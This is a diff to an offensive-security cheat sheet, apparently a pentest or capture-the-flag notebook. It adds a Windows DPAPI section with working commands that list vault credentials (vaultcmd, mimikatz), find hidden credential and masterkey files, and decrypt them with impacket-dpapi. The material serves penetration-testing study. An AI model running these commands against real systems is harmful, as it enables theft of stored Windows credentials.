@@ -6,6 +6,7 @@
 
 - [AES](#aes)
 - [bkcrack](#bkcrack)
+- [Data Protection API (DPAPI)](#data-protection-api-dpapi)
 - [DonPAPI](#donpapi)
 - [fcrack](#fcrack)
 - [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
@@ -105,6 +106,52 @@ Secret:HTB{
 
 ```c
 $ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p plaintext.txt
+```
+
+## Data Protection API (DPAPI)
+
+> https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
+
+> https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary
+
+### List Vault
+
+```c
+C:\> vaultcmd /listcreds:"Windows Credentials" /all
+```
+
+```c
+mimikatz vault::list
+```
+
+### Credential Files
+
+```c
+C:\> dir /a:h C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
+C:\> dir /a:h C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
+PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\
+PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
+```
+
+```c
+PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
+PS C:\> Get-ChildItem C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect
+PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
+PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect\
+PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\{SID}
+PS C:\> Get-ChildItem -Hidden C:\Users\<USERNAME>\AppData\Local\Microsoft\Protect\{SID}
+```
+
+### Get Masterkey
+
+```c
+$ impacket-dpapi masterkey -file 99cf31a4-a552-4cf7-a8d7-aca2d6f7339b -password <PASSWORD> -sid S-1-5-21-4024337825-2033395866-2055507597-1115
+```
+
+### Decrypt Data
+
+```c
+$ impacket-dpapi credential -file C4BB96844A5C9DD43D5B6A9759252BA6 -key 0xf8901b3125dd10208da9f66562df2e68e89a48cd0278b48a47f510df01418e68b253c61707f3935662243d81c0d352f1bc8055523bf65b2d763191ecd44e525a
 ```
 
 ## DonPAPI
